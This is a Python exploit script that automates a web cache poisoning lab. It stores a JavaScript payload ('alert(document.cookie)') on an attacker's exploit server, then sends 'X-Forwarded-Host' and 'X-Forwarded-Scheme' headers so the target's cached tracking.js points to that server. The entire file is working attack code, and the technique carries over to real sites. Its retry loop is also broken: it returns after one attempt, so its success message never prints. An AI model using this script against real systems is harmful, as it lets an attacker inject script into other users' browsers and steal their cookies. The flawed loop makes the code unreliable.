import requests
from colorama import Fore
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Web cache poisoning with multiple headers"


def run(url, payload=None, proxies=None):
    url = url.rstrip('/')
    exploit_input = input(
        Fore.YELLOW + "[?] Enter the exploit server URL: " + Fore.WHITE).strip()
    exploit_url = exploit_input.rstrip('/')
    exploit_domain = exploit_url.replace("https://", "").replace("/", "")

    print(Fore.WHITE +
          "[1] Storing the malicious javascript file on your exploit server", end="", flush=True)

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8"
    js_file = "alert(document.cookie);"
    data = {
        "responseFile": "/resources/js/tracking.js",
        "responseBody": js_file,
        "responseHead": response_head,
        "formAction": "STORE",
        "urlIsHttps": "on"
    }

    try:
        requests.post(exploit_url, data=data, allow_redirects=False,
                      verify=False, proxies=proxies)
        print(Fore.GREEN + "OK")
    except Exception as e:
        print(Fore.RED + f"\n[!] Failed to store JS file: {e}")
        return False

    print(Fore.WHITE + "[2] Poisoning the main page with unkeyed header")

    for counter in range(1, 31):
        print(Fore.WHITE + f"    → Attempt {counter}/30", end='\r', flush=True)
        headers = {"X-Forwarded-Host": exploit_domain,
                   "X-Forwarded-Scheme": "http"}
        print(Fore.WHITE +
              "[+] wait a minute and refresh the page, lab takes time to mark as solved")
        try:
            requests.get(f"{url}/resources/js/tracking.js", headers=headers,
                         allow_redirects=False, verify=False, proxies=proxies)
            return True
        except Exception as e:
            print(Fore.RED + f"\n[!] Error during poisoning: {e}")
            return False

    print(Fore.GREEN + "\nThe main page is poisoned successfully")
    return True
